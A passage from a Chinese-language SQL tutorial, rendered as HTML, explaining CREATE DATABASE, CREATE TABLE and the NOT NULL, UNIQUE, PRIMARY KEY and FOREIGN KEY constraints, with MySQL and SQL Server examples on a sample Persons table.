<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert <span class="keyword">into</span> table_name_new(column1,column2<span class="params">...</span>) <span class="keyword">select</span> column1,column2<span class="params">...</span> from table_name_old</span><br></pre></td></tr></table></figure>

<h4 id="SQL-CREATE-DATABASE-语句"><a href="#SQL-CREATE-DATABASE-语句" class="headerlink" title="SQL CREATE DATABASE 语句"></a>SQL CREATE DATABASE 语句</h4><p>CREATE DATABASE 语句用于创建数据库。</p>
<p>SQL CREATE DATABASE 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> dbname;</span><br></pre></td></tr></table></figure>

<p>SQL CREATE DATABASE 实例</p>
<p>下面的 SQL 语句创建一个名为 “my_db” 的数据库：</p>
<p>CREATE DATABASE my_db;</p>
<p>数据库表可以通过 CREATE TABLE 语句来添加。</p>
<h4 id="SQL-CREATE-TABLE-语句"><a href="#SQL-CREATE-TABLE-语句" class="headerlink" title="SQL CREATE TABLE 语句"></a>SQL CREATE TABLE 语句</h4><p>CREATE TABLE 语句用于创建数据库中的表。</p>
<p>表由行和列组成，每个表都必须有个表名</p>
<p>SQL CREATE TABLE 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>),</span><br><span class="line">column_name2 data_type(<span class="name">size</span>),</span><br><span class="line">column_name3 data_type(<span class="name">size</span>),</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>column_name 参数规定表中列的名称。</p>
<p>data_type 参数规定列的数据类型（例如 varchar、integer、decimal、date 等等）。</p>
<p>size 参数规定表中列的最大长度。</p>
<p><strong>提示：</strong>如需了解 MS Access、MySQL 和 SQL Server 中可用的数据类型，请访问我们完整的 <a href="https://www.runoob.com/sql/sql-datatypes.html" target="_blank" rel="noopener">数据类型参考手册</a>。</p>
<p>SQL CREATE TABLE 实例</p>
<p>现在我们想要创建一个名为 “Persons” 的表，包含五列：PersonID、LastName、FirstName、Address 和 City。</p>
<p>我们使用下面的 CREATE TABLE 语句：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">PersonID int,</span><br><span class="line">LastName varchar(255),</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>PersonID 列的数据类型是 int，包含整数。</p>
<p>LastName、FirstName、Address 和 City 列的数据类型是 varchar，包含字符，且这些字段的最大长度为 255 个字符。</p>
<p>空的 “Persons” 表如下所示：</p>
<table>
<thead>
<tr>
<th align="left">PersonID</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>提示：</strong>可使用 INSERT INTO 语句向空表写入数据。</p>
<h4 id="SQL-约束（Constraints）"><a href="#SQL-约束（Constraints）" class="headerlink" title="SQL 约束（Constraints）"></a>SQL 约束（Constraints）</h4><p>SQL 约束用于规定表中的数据规则。</p>
<p>如果存在违反约束的数据行为，行为会被约束终止。</p>
<p>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）。</p>
<p>SQL CREATE TABLE + CONSTRAINT 语法</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name2 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">column_name3 data_type(<span class="name">size</span>) constraint_name,</span><br><span class="line">....</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>在 SQL 中，我们有如下约束：</p>
<ul>
<li><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</li>
<li><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</li>
<li><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</li>
<li><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li>
<li><strong>CHECK</strong> - 保证列中的值符合指定的条件。</li>
<li><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</li>
</ul>
<p>在下面的章节，我们会详细讲解每一种约束。</p>
<p>PRIMARY KEY 约束的实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (Id_P)  //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line">(</span><br><span class="line">    Id_P <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span>,   //PRIMARY <span class="keyword">KEY</span>约束</span><br><span class="line">    LastName <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    FirstName <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    Address <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-NOT-NULL-约束"><a href="#SQL-NOT-NULL-约束" class="headerlink" title="SQL NOT NULL 约束"></a>SQL NOT NULL 约束</h4><p>NOT NULL 约束强制列不接受 NULL 值。</p>
<p>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p>
<p>下面的 SQL 强制 “P_Id” 列和 “LastName” 列不接受 NULL 值：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>删除表的字段的 not null 约束：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> x <span class="keyword">modify</span> column_name <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-UNIQUE-约束"><a href="#SQL-UNIQUE-约束" class="headerlink" title="SQL UNIQUE 约束"></a>SQL UNIQUE 约束</h4><p>UNIQUE 约束唯一标识数据库表中的每条记录。</p>
<p>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p>PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。</p>
<p>请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。</p>
<p>CREATE TABLE 时的 SQL UNIQUE 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 UNIQUE 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">UNIQUE (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> UNIQUE,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>uc_PersonID</strong> 是一个约束名 ！上面建的是唯一约束，为了方便区别约束名一般起得有规律点比如 UC（就是 UNIQUE CONSTRAINT 的缩写意思是唯一约束） uc_PersonID 就是对表中的PersonID 建唯一约束，强制约束 Id_P 和 LastName 唯一。</p>
<p>ALTER TABLE 时的 SQL UNIQUE 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> uc_PersonID <span class="keyword">UNIQUE</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p>撤销 UNIQUE 约束</p>
<p>如需撤销 UNIQUE 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> uc_PersonID</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb2(</span><br><span class="line">    tb2_id <span class="built_in">int</span> <span class="keyword">unique</span>,</span><br><span class="line">    tb2_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb2_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">unique</span>(tb2_name)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb2;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2(tb2_id,tb2_name,tb2_age) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb2 <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">'张三'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--建表时，创建约束，有约束名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb3(</span><br><span class="line">    tb3_id <span class="built_in">int</span> ,</span><br><span class="line">    tb3_name <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    tb3_age <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">constraint</span> no_id <span class="keyword">unique</span> (tb3_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'张三'</span>,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_age) <span class="keyword">values</span>(<span class="number">2</span>,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb3;</span><br><span class="line"></span><br><span class="line"><span class="comment">--已经有了tb3_id为1的行记录，再次插入，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3(tb3_id,tb3_name,tb3_age) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'李四'</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3表添加主键约束，主键名为：pk_id</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> pk_id primary <span class="keyword">key</span> (tb3_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">--给tb3_name添加唯一约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">add</span> <span class="keyword">constraint</span> un_name <span class="keyword">unique</span> (tb3_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">--已存在姓名为张三的记录，违反唯一约束</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--mysql 删除约束的语句，使用index，		oracle SqlServer等使用constraint</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb3 <span class="keyword">drop</span> <span class="keyword">index</span> un_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除约束后，允许存在多个tb3_name为张三的记录</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb3 <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'张三'</span>,<span class="number">26</span>);</span><br></pre></td></tr></table></figure>

<p>sql server 2008 删除约束的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">drop</span> constraint_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-PRIMARY-KEY-约束"><a href="#SQL-PRIMARY-KEY-约束" class="headerlink" title="SQL PRIMARY KEY 约束"></a>SQL PRIMARY KEY 约束</h4><p>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</p>
<p>主键必须包含唯一的值。</p>
<p>主键列不能包含 NULL 值。</p>
<p>每个表都应该有一个主键，并且每个表只能有一个主键。</p>
<p>CREATE TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>下面的 SQL 在 “Persons” 表创建时在 “P_Id” 列上创建 PRIMARY KEY 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY KEY,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">LastName varchar(255) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在上面的实例中，只有一个主键 PRIMARY KEY（pk_PersonID）。然而，pk_PersonID 的值是由两个列（P_Id 和 LastName）组成的。</p>
<p>ALTER TABLE 时的 SQL PRIMARY KEY 约束</p>
<p>当表已被创建时，如需在 “P_Id” 列创建 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span> (P_Id)</span><br></pre></td></tr></table></figure>

<p>如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，请使用下面的 SQL 语法：</p>
<p><strong>MySQL / SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> pk_PersonID PRIMARY <span class="keyword">KEY</span> (P_Id,LastName)</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>如果您使用 ALTER TABLE 语句添加主键，必须把主键列声明为不包含 NULL 值（在表首次创建时）。</p>
<p>撤销 PRIMARY KEY 约束</p>
<p>如需撤销 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<p>撤销PRIMARY KEY约束时，不论约束条件为一列还是多列，对于MySQL，撤销都是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span></span><br></pre></td></tr></table></figure>

<p>由于PRIMARY KEY唯一性，MYSQL处理办法简单。</p>
<p>但对于 SQL Server / Oracle / MS Access， 一个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> P_Id				//万一 P_Id有别的约束呢？</span><br></pre></td></tr></table></figure>

<p>若起约束名，也可如下多个列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Persons</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> pk_PersonID</span><br></pre></td></tr></table></figure>

<h4 id="SQL-FOREIGN-KEY-约束"><a href="#SQL-FOREIGN-KEY-约束" class="headerlink" title="SQL FOREIGN KEY 约束"></a>SQL FOREIGN KEY 约束</h4><p>一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY(唯一约束的键)。</p>
<p>让我们通过一个实例来解释外键。请看下面两个表：</p>
<p>“Persons” 表：</p>
<table>
<thead>
<tr>
<th align="left">P_Id</th>
<th align="left">LastName</th>
<th align="left">FirstName</th>
<th align="left">Address</th>
<th align="left">City</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">Hansen</td>
<td align="left">Ola</td>
<td align="left">Timoteivn 10</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">Svendson</td>
<td align="left">Tove</td>
<td align="left">Borgvn 23</td>
<td align="left">Sandnes</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Pettersen</td>
<td align="left">Kari</td>
<td align="left">Storgt 20</td>
<td align="left">Stavanger</td>
</tr>
</tbody></table>
<p>“Orders” 表：</p>
<table>
<thead>
<tr>
<th align="left">O_Id</th>
<th align="left">OrderNo</th>
<th align="left">P_Id</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">77895</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">44678</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">22456</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">24562</td>
<td align="left">1</td>
</tr>
</tbody></table>
<p>请注意，</p>
<p>“Orders” 表中的 “O_Id” 列指向 “Persons” 表中的 “P_Id” 列。</p>
<p>“Persons” 表中的 “P_Id” 列是 “Persons” 表中的 PRIMARY KEY。</p>
<p>“Orders” 表中的 “O_Id” 列是 “Orders” 表中的 FOREIGN KEY。</p>
<p>FOREIGN KEY 约束用于预防破坏表之间连接的行为。</p>
<p>FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
<p>CREATE TABLE 时的 SQL FOREIGN KEY 约束</p>
<p>下面的 SQL 在 “Orders” 表创建时在 “P_Id” 列上创建 FOREIGN KEY 约束：</p>
<p><strong>MySQL：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(</span><br><span class="line">O_Id <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">OrderNo <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">P_Id <span class="built_in">int</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (O_Id),</span><br><span class="line"><span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (P_Id) <span class="keyword">REFERENCES</span> Persons(P_Id)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>SQL Server / Oracle / MS Access：</strong></p>
